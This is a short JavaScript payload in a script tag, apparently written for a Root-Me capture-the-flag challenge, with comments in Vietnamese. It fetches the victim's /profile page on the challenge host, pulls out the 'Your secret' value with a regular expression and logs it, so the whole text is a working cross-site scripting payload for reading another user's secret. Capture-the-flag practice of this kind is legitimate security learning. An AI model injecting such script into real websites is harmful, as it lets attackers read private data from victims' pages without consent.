<script>
    function token1() {
        xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", decodeURIComponent("http://challenge01.root-me.org:58003/profile"), false);
        xmlHttp.send(null); 
        var str1 = xmlHttp.responseText;
        var secret = extractSecret(str1);
        return secret;
    }

    function extractSecret(htmlString) {
        var matches = htmlString.match(/<u>Your secret<\/u>: (\d+)<\/p>/);
        if (matches && matches.length > 1) {
            return matches[1];
        } else {
            return "Secret not found";
        }
    }

    // Sử dụng hàm token1() để lấy giá trị secret
    var secretValue = token1();
    console.log(secretValue); // Hiển thị giá trị secret trong console log
    // Bạn có thể sử dụng secretValue để hiển thị giá trị secret ở đâu đó trên trang web, ví dụ:
    // document.getElementById("secretContainer").innerText = secretValue;
</script>
